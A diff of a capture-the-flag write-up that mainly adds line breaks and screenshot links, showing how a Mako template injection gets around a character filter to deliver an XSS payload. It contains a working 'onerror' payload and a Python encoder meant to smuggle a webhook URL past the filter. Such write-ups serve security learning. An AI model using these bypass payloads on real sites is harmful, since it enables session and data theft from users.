@@ -61,23 +61,25 @@ Now we need to think about getting a xss using open and closing tag but it's blo
     template = Template(templ, lookup=lookup)
     return template.render(name_to_display=name_to_display, banned="&<>()")
 ```
+<br />
 So we can access anything from banned list which contain our needed string using the ssti we have the open and closing tag for xss in banned here, so to get `<` for example
 we can do `${banned[1]}` this will get us `<`
 Let's try get `<` : 
-
-<img>
-
+<br />
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/2.png">
+<br />
 As we can see it worked now can get a working payload like `<img src=x onerror=alert()>`
 
 I replaced s with S and l with L 
+<br />
 ```${banned[1]}img Src=x onerror=aLert`1`${banned[2]}```
-
-<img>
-
+<br />
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/3.png">
+<br />
 But if we want to insert the webhook it will contain a lot of things that blocked but we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 
 
 Let's make a script that will help us convert everything 
-
+<br />
 ```py
 st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]
 
@@ -95,8 +97,6 @@ ${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x2f
 ```
 
 But when we try it it's rendered as text we can use iframe to load it as html
-
-<img>
 
 ```py
 st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]
